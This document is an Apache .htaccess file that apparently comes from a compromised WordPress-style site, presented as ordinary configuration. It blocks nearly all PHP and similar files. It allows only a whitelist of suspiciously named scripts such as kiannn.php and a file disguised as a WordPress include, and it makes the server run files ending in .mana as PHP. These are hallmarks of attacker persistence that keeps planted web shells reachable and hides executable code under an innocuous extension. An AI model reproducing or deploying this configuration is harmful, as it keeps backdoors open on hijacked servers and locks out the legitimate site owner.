<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.a*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.A*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.S*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.s*>
    Order Deny,Allow
    Deny from all
</Files>

<FilesMatch "^(index.php|ar.php|Mods45Schemas.php|class-wp-includes-background-image-control.php|DB_config.shtml|templates.php|PluginsHandling.inc.php|kiannn.php|Options-Meta.php|pluginsnew.php)$">

 Order allow,deny

 Allow from all

</FilesMatch>

<IfModule mod_rewrite.c>

RewriteEngine On

RewriteBase /

RewriteRule ^index.php$ - [L]

RewriteCond %{REQUEST_FILENAME} !-f

RewriteCond %{REQUEST_FILENAME} !-d

RewriteRule . /index.php [L]

</IfModule>

AddType application/x-httpd-php .mana
